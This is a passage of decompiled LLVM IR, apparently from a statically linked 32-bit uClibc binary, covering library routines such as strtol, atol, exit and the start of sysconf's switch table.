  %v3_804b403 = inttoptr i32 %v2_804b403 to i32*
  store i32 %v0_804b403, i32* %v3_804b403, align 4
  %v0_804b406 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804b40b = inttoptr i32 %v0_804b406 to i32*
  %v3_804b40b = call i32 @srandom_r(i32 %arg1, i32* %v2_804b40b)
  %v0_804b410 = load i32, i32* @ebp, align 4
  %v1_804b410 = inttoptr i32 %v0_804b410 to i32*
  store i32 0, i32* %v1_804b410, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b41b = load i32, i32* @ebx, align 4
  %v1_804b41b = icmp eq i32 %v0_804b41b, 0
  br i1 %v1_804b41b, label %dec_label_pc_804b44c, label %dec_label_pc_804b41f

dec_label_pc_804b41f:                             ; preds = %dec_label_pc_804b3e3
  %v0_804b41f = load i32, i32* @edi, align 4
  %v1_804b41f = add i32 %v0_804b41f, 4
  %v2_804b41f = inttoptr i32 %v1_804b41f to i32*
  %v3_804b41f = load i32, i32* %v2_804b41f, align 4
  %v1_804b422 = load i32, i32* @esi, align 4
  %v2_804b422 = sub i32 %v3_804b41f, %v1_804b422
  %v2_804b424 = sdiv i32 %v2_804b422, 4
  %v3_804b427 = mul i32 %v2_804b424, 5
  %v2_804b42a = add i32 %v3_804b427, %v0_804b41b
  %v1_804b42c = load i32, i32* @ebp, align 4
  %v2_804b42c = inttoptr i32 %v1_804b42c to i32*
  store i32 %v2_804b42a, i32* %v2_804b42c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b44c

dec_label_pc_804b433:                             ; preds = %dec_label_pc_804b3d2
  %v1_804b433 = call i32 @__errno_location(i32 %v0_804b3ac)
  store i32 %v1_804b433, i32* %eax.global-to-local, align 4
  %v1_804b438 = inttoptr i32 %v1_804b433 to i32*
  store i32 22, i32* %v1_804b438, align 4
  %v0_804b43e = load i32, i32* %stack_var_-36, align 4
  %v1_804b43e = call i32 @__errno_location(i32 %v0_804b43e)
  %v1_804b443 = inttoptr i32 %v1_804b43e to i32*
  store i32 22, i32* %v1_804b443, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b44c

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b3e3, %dec_label_pc_804b41f, %dec_label_pc_804b433
  %v0_804b453 = phi i32 [ 0, %dec_label_pc_804b3e3 ], [ 0, %dec_label_pc_804b41f ], [ -1, %dec_label_pc_804b433 ]
  store i32 %v0_804b3ab, i32* @esi, align 4
  ret i32 %v0_804b453

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b44c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3e3, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804b45f = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804b45f
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804b479 = inttoptr i32 %arg1 to i8*
  %v5_804b479 = call i32 @_stdlib_strto_l(i8* %v4_804b479, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804b479
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b487 = load i32, i32* @ebx, align 4
  store i32 %v0_804b487, i32* %stack_var_-16, align 4
  %v4_804b48b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b48b, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_804b493 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804b493, i32* %edx.global-to-local, align 4
  store i32 %v4_804b48b, i32* %ebx.global-to-local, align 4
  %v2_804b49e41 = load i8, i8* %arg1, align 1
  %v3_804b49e42 = sext i8 %v2_804b49e41 to i32
  store i32 %v3_804b49e42, i32* %eax.global-to-local, align 4
  %v2_804b4a143 = mul nsw i32 %v3_804b49e42, 2
  %v3_804b4a144 = add i32 %v2_804b4a143, %v0_804b493
  %v4_804b4a145 = inttoptr i32 %v3_804b4a144 to i8*
  %v5_804b4a146 = load i8, i8* %v4_804b4a145, align 1
  %v6_804b4a147 = and i8 %v5_804b4a146, 32
  %v7_804b4a148 = icmp eq i8 %v6_804b4a147, 0
  %v1_804b4a549 = icmp eq i1 %v7_804b4a148, false
  br i1 %v1_804b4a549, label %dec_label_pc_804b49d, label %dec_label_pc_804b4a7

dec_label_pc_804b49d:                             ; preds = %entry, %dec_label_pc_804b49d
  %v0_804b49d50 = phi i32 [ %v1_804b49d, %dec_label_pc_804b49d ], [ %v4_804b48b, %entry ]
  %v1_804b49d = add i32 %v0_804b49d50, 1
  store i32 %v1_804b49d, i32* %ebx.global-to-local, align 4
  %v1_804b49e = inttoptr i32 %v1_804b49d to i8*
  %v2_804b49e = load i8, i8* %v1_804b49e, align 1
  %v3_804b49e = sext i8 %v2_804b49e to i32
  store i32 %v3_804b49e, i32* %eax.global-to-local, align 4
  %v2_804b4a1 = mul nsw i32 %v3_804b49e, 2
  %v3_804b4a1 = add i32 %v2_804b4a1, %v0_804b493
  %v4_804b4a1 = inttoptr i32 %v3_804b4a1 to i8*
  %v5_804b4a1 = load i8, i8* %v4_804b4a1, align 1
  %v6_804b4a1 = and i8 %v5_804b4a1, 32
  %v7_804b4a1 = icmp eq i8 %v6_804b4a1, 0
  %v1_804b4a5 = icmp eq i1 %v7_804b4a1, false
  br i1 %v1_804b4a5, label %dec_label_pc_804b49d, label %dec_label_pc_804b4a7

dec_label_pc_804b4a7:                             ; preds = %dec_label_pc_804b49d, %entry
  %v0_804b49d.lcssa = phi i32 [ %v4_804b48b, %entry ], [ %v1_804b49d, %dec_label_pc_804b49d ]
  %v2_804b49e.lcssa = phi i8 [ %v2_804b49e41, %entry ], [ %v2_804b49e, %dec_label_pc_804b49d ]
  %v3_804b49e.lcssa = phi i32 [ %v3_804b49e42, %entry ], [ %v3_804b49e, %dec_label_pc_804b49d ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804b4a7 = icmp eq i8 %v2_804b49e.lcssa, 43
  br i1 %v9_804b4a7, label %dec_label_pc_804b4c2, label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b4a7
  %v9_804b4ac = icmp eq i8 %v2_804b49e.lcssa, 45
  %v1_804b4b4 = icmp eq i1 %v9_804b4ac, false
  br i1 %v1_804b4b4, label %dec_label_pc_804b4c3, label %dec_label_pc_804b4c2

dec_label_pc_804b4c2:                             ; preds = %dec_label_pc_804b4a7, %dec_label_pc_804b4ac
  %storemerge5 = phi i8 [ 1, %dec_label_pc_804b4ac ], [ 0, %dec_label_pc_804b4a7 ]
  %v1_804b4c2 = add i32 %v0_804b49d.lcssa, 1
  store i32 %v1_804b4c2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b4c3

dec_label_pc_804b4c3:                             ; preds = %dec_label_pc_804b4ac, %dec_label_pc_804b4c2
  %v0_804b4d5 = phi i32 [ %v1_804b4c2, %dec_label_pc_804b4c2 ], [ %v0_804b49d.lcssa, %dec_label_pc_804b4ac ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_804b4c2 ], [ 0, %dec_label_pc_804b4ac ]
  %v1_804b4c3 = and i32 %arg3, -17
  %v2_804b4c3 = icmp eq i32 %v1_804b4c3, 0
  %v1_804b4cb = icmp eq i1 %v2_804b4c3, false
  br i1 %v1_804b4cb, label %dec_label_pc_804b4f1, label %dec_label_pc_804b4cd

dec_label_pc_804b4cd:                             ; preds = %dec_label_pc_804b4c3
  %v1_804b4cd = add i32 %arg3, 10
  store i32 %v1_804b4cd, i32* %esi.global-to-local, align 4
  %v1_804b4d0 = inttoptr i32 %v0_804b4d5 to i8*
  %v2_804b4d0 = load i8, i8* %v1_804b4d0, align 1
  %v8_804b4d0 = icmp eq i8 %v2_804b4d0, 48
  %v1_804b4d3 = icmp eq i1 %v8_804b4d0, false
  br i1 %v1_804b4d3, label %dec_label_pc_804b4e6, label %dec_label_pc_804b4d5

dec_label_pc_804b4d5:                             ; preds = %dec_label_pc_804b4cd
  %v1_804b4d5 = add i32 %v0_804b4d5, 1
  store i32 %v1_804b4d5, i32* %ebx.global-to-local, align 4
  %v1_804b4d6 = add i32 %arg3, 8
  store i32 %v1_804b4d6, i32* %esi.global-to-local, align 4
  %v1_804b4d9 = inttoptr i32 %v1_804b4d5 to i8*
  %v2_804b4d9 = load i8, i8* %v1_804b4d9, align 1
  %v2_804b4dd = or i8 %v2_804b4d9, 32
  %v7_804b4dd = zext i8 %v2_804b4dd to i32
  %v9_804b4dd = and i32 %v3_804b49e.lcssa, -256
  %v10_804b4dd = or i32 %v7_804b4dd, %v9_804b4dd
  store i32 %v10_804b4dd, i32* %eax.global-to-local, align 4
  %v10_804b4df = icmp eq i8 %v2_804b4dd, 120
  %v1_804b4e1 = icmp eq i1 %v10_804b4df, false
  br i1 %v1_804b4e1, label %dec_label_pc_804b4e6, label %dec_label_pc_804b4e3

dec_label_pc_804b4e3:                             ; preds = %dec_label_pc_804b4d5
  %v2_804b4e3 = mul i32 %v1_804b4d6, 2
  store i32 %v2_804b4e3, i32* %esi.global-to-local, align 4
  %v1_804b4e5 = add i32 %v0_804b4d5, 2
  store i32 %v1_804b4e5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b4e6

dec_label_pc_804b4e6:                             ; preds = %dec_label_pc_804b4d5, %dec_label_pc_804b4cd, %dec_label_pc_804b4e3
  %v0_804b50e13 = phi i32 [ %v1_804b4d5, %dec_label_pc_804b4d5 ], [ %v0_804b4d5, %dec_label_pc_804b4cd ], [ %v1_804b4e5, %dec_label_pc_804b4e3 ]
  %v0_804b56822 = phi i32 [ %v1_804b4d5, %dec_label_pc_804b4d5 ], [ %v4_804b48b, %dec_label_pc_804b4cd ], [ %v1_804b4d5, %dec_label_pc_804b4e3 ]
  %v3_804b4ee = phi i32 [ %v1_804b4d6, %dec_label_pc_804b4d5 ], [ %v1_804b4cd, %dec_label_pc_804b4cd ], [ %v2_804b4e3, %dec_label_pc_804b4e3 ]
  %v1_804b4e6 = add i32 %v3_804b4ee, -17
  %v6_804b4e6 = sub i32 16, %v3_804b4ee
  %v7_804b4e6 = and i32 %v6_804b4e6, %v3_804b4ee
  %v8_804b4e6 = icmp slt i32 %v7_804b4e6, 0
  %v10_804b4e6 = icmp slt i32 %v1_804b4e6, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_804b4ee = icmp eq i1 %v10_804b4e6, %v8_804b4e6
  %v5_804b4ee = select i1 %v2_804b4ee, i32 16, i32 %v3_804b4ee
  store i32 %v5_804b4ee, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b4f1

dec_label_pc_804b4f1:                             ; preds = %dec_label_pc_804b4c3, %dec_label_pc_804b4e6
  %v0_804b56823 = phi i32 [ %v4_804b48b, %dec_label_pc_804b4c3 ], [ %v0_804b56822, %dec_label_pc_804b4e6 ]
  %v0_804b50e12 = phi i32 [ %v0_804b4d5, %dec_label_pc_804b4c3 ], [ %v0_804b50e13, %dec_label_pc_804b4e6 ]
  %v0_804b500 = phi i32 [ %arg3, %dec_label_pc_804b4c3 ], [ %v5_804b4ee, %dec_label_pc_804b4e6 ]
  %v1_804b4f1 = add i32 %v0_804b500, -2
  store i32 %v1_804b4f1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804b4f9 = icmp ugt i32 %v1_804b4f1, 34
  br i1 %v6_804b4f9, label %dec_label_pc_804b55d, label %dec_label_pc_804b4fb

dec_label_pc_804b4fb:                             ; preds = %dec_label_pc_804b4f1
  %div = udiv i32 -1, %v0_804b500
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804b500
  %v1_804b502 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804b53b = urem i32 %arg4, 256
  br label %dec_label_pc_804b50e

dec_label_pc_804b50c:                             ; preds = %dec_label_pc_804b553, %dec_label_pc_804b53b
  %v2_804b510.pre = phi i32 [ %v0_804b556, %dec_label_pc_804b553 ], [ %v2_804b510.pre.pre, %dec_label_pc_804b53b ]
  %v4_804b50e.pre = phi i32 [ %v1_804b527, %dec_label_pc_804b553 ], [ %v4_804b50e.pre.pre, %dec_label_pc_804b53b ]
  %v0_804b50c = phi i32 [ %v1_804b52e, %dec_label_pc_804b553 ], [ %v0_804b50c.pre, %dec_label_pc_804b53b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_804b553 ], [ %v6_804b53f, %dec_label_pc_804b53b ]
  br label %dec_label_pc_804b50e

dec_label_pc_804b50e:                             ; preds = %dec_label_pc_804b4fb, %dec_label_pc_804b50c
  %v0_804b56821 = phi i32 [ %v0_804b56823, %dec_label_pc_804b4fb ], [ %v0_804b50c, %dec_label_pc_804b50c ]
  %v0_804b52e = phi i32 [ %v0_804b50e12, %dec_label_pc_804b4fb ], [ %v0_804b50c, %dec_label_pc_804b50c ]
  %v2_804b510 = phi i32 [ %v4_804b48b, %dec_label_pc_804b4fb ], [ %v2_804b510.pre, %dec_label_pc_804b50c ]
  %v4_804b50e = phi i32 [ %div, %dec_label_pc_804b4fb ], [ %v4_804b50e.pre, %dec_label_pc_804b50c ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804b4fb ], [ %stack_var_-18.1, %dec_label_pc_804b50c ]
  %v1_804b50e = inttoptr i32 %v0_804b52e to i8*
  %v2_804b50e = load i8, i8* %v1_804b50e, align 1
  %v3_804b50e = zext i8 %v2_804b50e to i32
  %v5_804b50e = and i32 %v4_804b50e, -256
  %v6_804b50e = or i32 %v3_804b50e, %v5_804b50e
  store i32 %v6_804b50e, i32* %eax.global-to-local, align 4
  %v2_804b512 = add i8 %v2_804b50e, -48
  %v12_804b512 = zext i8 %v2_804b512 to i32
  %v14_804b512 = and i32 %v2_804b510, -256
  %v15_804b512 = or i32 %v12_804b512, %v14_804b512
  store i32 %v15_804b512, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_804b512, 10
  br i1 %tmp, label %dec_label_pc_804b527, label %dec_label_pc_804b51a

dec_label_pc_804b51a:                             ; preds = %dec_label_pc_804b50e
  %v2_804b51a = or i8 %v2_804b50e, 32
  %v7_804b51a = zext i8 %v2_804b51a to i32
  %v10_804b51a = or i32 %v7_804b51a, %v5_804b50e
  store i32 %v10_804b51a, i32* %eax.global-to-local, align 4
  %v2_804b51c = or i32 %v14_804b512, 40
  store i32 %v2_804b51c, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_804b51a, 97
  br i1 %tmp55, label %dec_label_pc_804b527, label %dec_label_pc_804b522

dec_label_pc_804b522:                             ; preds = %dec_label_pc_804b51a
  %v2_804b524 = add i8 %v2_804b51a, -87
  %v15_804b524 = zext i8 %v2_804b524 to i32
  %v18_804b524 = or i32 %v15_804b524, %v14_804b512
  store i32 %v18_804b524, i32* @ecx, align 4
  br label %dec_label_pc_804b527

dec_label_pc_804b527:                             ; preds = %dec_label_pc_804b51a, %dec_label_pc_804b50e, %dec_label_pc_804b522
  %v0_804b556 = phi i32 [ %v2_804b51c, %dec_label_pc_804b51a ], [ %v15_804b512, %dec_label_pc_804b50e ], [ %v18_804b524, %dec_label_pc_804b522 ]
  %v1_804b527 = urem i32 %v0_804b556, 256
  store i32 %v1_804b527, i32* %eax.global-to-local, align 4
  %v1_804b52a = load i32, i32* %esi.global-to-local, align 4
  %v2_804b52a = sub i32 %v1_804b527, %v1_804b52a
  %v10_804b52a = and i32 %v2_804b52a, %v1_804b52a
  %v11_804b52a = icmp slt i32 %v10_804b52a, 0
  %v13_804b52a = icmp slt i32 %v2_804b52a, 0
  %v2_804b52c = icmp eq i1 %v13_804b52a, %v11_804b52a
  br i1 %v2_804b52c, label %dec_label_pc_804b55d, label %dec_label_pc_804b52e

dec_label_pc_804b52e:                             ; preds = %dec_label_pc_804b527
  %v1_804b52e = add i32 %v0_804b52e, 1
  store i32 %v1_804b52e, i32* %ebx.global-to-local, align 4
  %v0_804b52f = load i32, i32* %edx.global-to-local, align 4
  %v1_804b52f = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_804b52f, %v1_804b52f
  br i1 %tmp56, label %dec_label_pc_804b53b, label %dec_label_pc_804b533

dec_label_pc_804b533:                             ; preds = %dec_label_pc_804b52e
  %v12_804b52f = icmp eq i32 %v0_804b52f, %v1_804b52f
  %v1_804b533 = icmp eq i1 %v12_804b52f, false
  br i1 %v1_804b533, label %dec_label_pc_804b553, label %dec_label_pc_804b535

dec_label_pc_804b535:                             ; preds = %dec_label_pc_804b533
  %v1_804b535 = trunc i32 %v0_804b556 to i8
  %tmp57 = icmp ugt i8 %v1_804b535, %v1_804b502
  br i1 %tmp57, label %dec_label_pc_804b53b, label %dec_label_pc_804b553

dec_label_pc_804b53b:                             ; preds = %dec_label_pc_804b535, %dec_label_pc_804b52e
  store i32 %v4_804b53b, i32* %eax.global-to-local, align 4
  %v6_804b53f = and i8 %stack_var_-18.2, %tmp37
  %v1_804b543 = sext i8 %v6_804b53f to i32
  %v2_804b543 = call i32 @__errno_location(i32 %v1_804b543)
  store i32 %v2_804b543, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804b54b = inttoptr i32 %v2_804b543 to i32*
  store i32 34, i32* %v1_804b54b, align 4
  %v0_804b50c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804b50e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804b510.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804b50c

dec_label_pc_804b553:                             ; preds = %dec_label_pc_804b535, %dec_label_pc_804b533
  %v4_804b553 = mul i32 %v0_804b52f, %v1_804b52a
  store i32 %v1_804b527, i32* %eax.global-to-local, align 4
  %v2_804b559 = add i32 %v4_804b553, %v1_804b527
  store i32 %v2_804b559, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b50c

dec_label_pc_804b55d:                             ; preds = %dec_label_pc_804b527, %dec_label_pc_804b4f1
  %v0_804b568 = phi i32 [ %v0_804b56823, %dec_label_pc_804b4f1 ], [ %v0_804b56821, %dec_label_pc_804b527 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804b4f1 ], [ %stack_var_-18.2, %dec_label_pc_804b527 ]
  %v4_804b55d = icmp eq i32 %arg2, 0
  br i1 %v4_804b55d, label %dec_label_pc_804b56a, label %dec_label_pc_804b564

dec_label_pc_804b564:                             ; preds = %dec_label_pc_804b55d
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b568 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804b568, i32* %v2_804b568, align 4
  br label %dec_label_pc_804b56a

dec_label_pc_804b56a:                             ; preds = %dec_label_pc_804b55d, %dec_label_pc_804b564
  %v8_804b56a = icmp eq i8 %stack_var_-18.3, 0
  %v2_804b56f = zext i1 %v8_804b56a to i32
  %v13_804b56f = icmp eq i1 %v8_804b56a, false
  %v1_804b5713 = or i32 %v2_804b56f, -2147483648
  store i32 %v1_804b5713, i32* %ebx.global-to-local, align 4
  %v5_804b577 = icmp eq i8 %tmp37, 0
  br i1 %v5_804b577, label %dec_label_pc_804b58f, label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %dec_label_pc_804b56a
  %v0_804b57e = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_804b57e, %v1_804b5713
  br i1 %tmp58, label %dec_label_pc_804b582, label %dec_label_pc_804b58f

dec_label_pc_804b582:                             ; preds = %dec_label_pc_804b57e
  %v1_804b582 = sext i8 %stack_var_-18.3 to i32
  %v2_804b582 = call i32 @__errno_location(i32 %v1_804b582)
  store i32 %v2_804b582, i32* %eax.global-to-local, align 4
  %v0_804b587 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b587, i32* %edx.global-to-local, align 4
  %v1_804b589 = inttoptr i32 %v2_804b582 to i32*
  store i32 34, i32* %v1_804b589, align 4
  br label %dec_label_pc_804b58f

dec_label_pc_804b58f:                             ; preds = %dec_label_pc_804b57e, %dec_label_pc_804b56a, %dec_label_pc_804b582
  %v0_804b58f = load i32, i32* %edx.global-to-local, align 4
  %v1_804b591 = sub i32 0, %v0_804b58f
  %v4_804b598 = select i1 %v13_804b56f, i32 %v1_804b591, i32 %v0_804b58f
  store i32 %v4_804b598, i32* @edx, align 4
  %v2_804b59e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b59e, i32* @ebx, align 4
  store i32 %v4_804b598, i32* %eax.global-to-local, align 4
  ret i32 %v4_804b598

; uselistorder directives
  uselistorder i32 %v4_804b598, { 1, 0, 2 }
  uselistorder i1 %v8_804b56a, { 1, 0 }
  uselistorder i8 %v6_804b53f, { 1, 0 }
  uselistorder i32 %v1_804b52f, { 1, 0 }
  uselistorder i32 %v0_804b52f, { 2, 1, 0 }
  uselistorder i32 %v1_804b52e, { 1, 0 }
  uselistorder i32 %v2_804b52a, { 1, 0 }
  uselistorder i32 %v1_804b527, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804b556, { 2, 0, 1 }
  uselistorder i8 %v2_804b51a, { 1, 0, 2 }
  uselistorder i32 %v14_804b512, { 0, 2, 1 }
  uselistorder i32 %v0_804b50c, { 1, 0 }
  uselistorder i32 %v0_804b500, { 1, 0, 2 }
  uselistorder i32 %v3_804b4ee, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b4e3, { 1, 0 }
  uselistorder i32 %v1_804b4d6, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_804b4d5, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_804b49e.lcssa, { 1, 0 }
  uselistorder i32 %v0_804b49d.lcssa, { 1, 0 }
  uselistorder i32 %v1_804b49d, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804b493, { 1, 0, 2 }
  uselistorder i32 %v4_804b48b, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 6, 7, 8, 9, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b58f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b56a, { 1, 0 }
  uselistorder label %dec_label_pc_804b527, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b50e, { 1, 0 }
  uselistorder label %dec_label_pc_804b4f1, { 1, 0 }
  uselistorder label %dec_label_pc_804b4e6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b4c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b4c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b49d, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804b5bb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b5bb, i32* @ebx, align 4
  %v2_804b5c0 = call i32 @__pthread_return_void(i32 %v2_804b5bb, i32 134526871)
  %v1_804b5cc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052140.66 to i32))
  %v0_804b5d1 = load i32, i32* @global_var_8052504.67, align 4
  store i32 %v0_804b5d1, i32* @eax, align 4
  %v1_804b5d9 = icmp eq i32 %v0_804b5d1, 0
  br i1 %v1_804b5d9, label %dec_label_pc_804b5e6, label %dec_label_pc_804b5dd

dec_label_pc_804b5dd:                             ; preds = %entry
  %v0_804b5e0 = load i32, i32* @esi, align 4
  %v1_804b5e1 = call i32 @unknown_0(i32 %v0_804b5e0)
  store i32 %v1_804b5e1, i32* @eax, align 4
  br label %dec_label_pc_804b5e6

dec_label_pc_804b5e6:                             ; preds = %entry, %dec_label_pc_804b5dd
  %v2_804b5eb = call i32 @__pthread_return_void(i32 %v2_804b5bb, i32 1)
  %v0_804b5f0 = call i32 @__GI___uClibc_fini()
  %v0_804b601 = call i32 @_stdio_term()
  %v0_804b609 = load i32, i32* @esi, align 4
  %v1_804b60a = call i32 @__GI__exit(i32 %v0_804b609)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_804b5e6, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_804b62f [
    i32 0, label %dec_label_pc_804b63f
    i32 1, label %dec_label_pc_804b724
    i32 2, label %dec_label_pc_804b649
    i32 3, label %dec_label_pc_804b653
    i32 4, label %dec_label_pc_804b65d
    i32 5, label %dec_label_pc_804b6f3
    i32 6, label %dec_label_pc_804b665
    i32 7, label %dec_label_pc_804b625
    i32 8, label %dec_label_pc_804b625
    i32 9, label %dec_label_pc_804b625
    i32 10, label %dec_label_pc_804b625
    i32 11, label %dec_label_pc_804b625
    i32 12, label %dec_label_pc_804b625
    i32 13, label %dec_label_pc_804b625
    i32 14, label %dec_label_pc_804b625
    i32 15, label %dec_label_pc_804b625
    i32 16, label %dec_label_pc_804b625
    i32 17, label %dec_label_pc_804b625
    i32 18, label %dec_label_pc_804b625
    i32 19, label %dec_label_pc_804b625
    i32 20, label %dec_label_pc_804b625
    i32 21, label %dec_label_pc_804b625
    i32 22, label %dec_label_pc_804b625
    i32 23, label %dec_label_pc_804b724
    i32 24, label %dec_label_pc_804b724
    i32 25, label %dec_label_pc_804b730
    i32 26, label %dec_label_pc_804b701
    i32 27, label %dec_label_pc_804b724
    i32 28, label %dec_label_pc_804b677
    i32 29, label %dec_label_pc_804b6fa
    i32 30, label %dec_label_pc_804b66f
    i32 31, label %dec_label_pc_804b70f
    i32 32, label %dec_label_pc_804b724
    i32 33, label %dec_label_pc_804b724
    i32 34, label %dec_label_pc_804b724
    i32 35, label %dec_label_pc_804b708
    i32 36, label %dec_label_pc_804b737
    i32 37, label %dec_label_pc_804b73e
    i32 38, label %dec_label_pc_804b737
    i32 39, label %dec_label_pc_804b681
    i32 40, label %dec_label_pc_804b745
    i32 41, label %dec_label_pc_804b724
    i32 42, label %dec_label_pc_804b70f
    i32 43, label %dec_label_pc_804b73e
    i32 44, label %dec_label_pc_804b74c
    i32 45, label %dec_label_pc_804b73e
    i32 46, label %dec_label_pc_804b6fa
    i32 47, label %dec_label_pc_804b6fa
    i32 48, label %dec_label_pc_804b6fa
    i32 49, label %dec_label_pc_804b724
    i32 50, label %dec_label_pc_804b724
    i32 51, label %dec_label_pc_804b6fa
    i32 52, label %dec_label_pc_804b6fa
    i32 53, label %dec_label_pc_804b724
    i32 54, label %dec_label_pc_804b724
    i32 55, label %dec_label_pc_804b724
    i32 56, label %dec_label_pc_804b724
    i32 57, label %dec_label_pc_804b724
    i32 58, label %dec_label_pc_804b724
    i32 59, label %dec_label_pc_804b724
    i32 60, label %dec_label_pc_804b724
    i32 61, label %dec_label_pc_804b724
    i32 62, label %dec_label_pc_804b724
    i32 63, label %dec_label_pc_804b724
    i32 64, label %dec_label_pc_804b724
    i32 65, label %dec_label_pc_804b724
    i32 66, label %dec_label_pc_804b724
    i32 67, label %dec_label_pc_804b625
    i32 68, label %dec_label_pc_804b625
    i32 69, label %dec_label_pc_804b708
    i32 70, label %dec_label_pc_804b708
    i32 71, label %dec_label_pc_804b708
    i32 72, label %dec_label_pc_804b70f
    i32 73, label %dec_label_pc_804b716
    i32 74, label %dec_label_pc_804b71d
    i32 75, label %dec_label_pc_804b68b
    i32 76, label %dec_label_pc_804b71d
    i32 77, label %dec_label_pc_804b625
    i32 78, label %dec_label_pc_804b625
    i32 79, label %dec_label_pc_804b625
    i32 80, label %dec_label_pc_804b625
    i32 81, label %dec_label_pc_804b625
    i32 82, label %dec_label_pc_804b625
    i32 83, label %dec_label_pc_804b625
    i32 84, label %dec_label_pc_804b625
    i32 85, label %dec_label_pc_804b724
    i32 86, label %dec_label_pc_804b724
    i32 87, label %dec_label_pc_804b701
    i32 88, label %dec_label_pc_804b695
    i32 89, label %dec_label_pc_804b69f
    i32 90, label %dec_label_pc_804b716
    i32 91, label %dec_label_pc_804b625
    i32 92, label %dec_label_pc_804b625
    i32 93, label %dec_label_pc_804b625
    i32 94, label %dec_label_pc_804b625
    i32 95, label %dec_label_pc_804b6fa
    i32 96, label %dec_label_pc_804b724
    i32 97, label %dec_label_pc_804b724
    i32 98, label %dec_label_pc_804b625
    i32 99, label %dec_label_pc_804b625
    i32 100, label %dec_label_pc_804b625
    i32 101, label %dec_label_pc_804b6a9
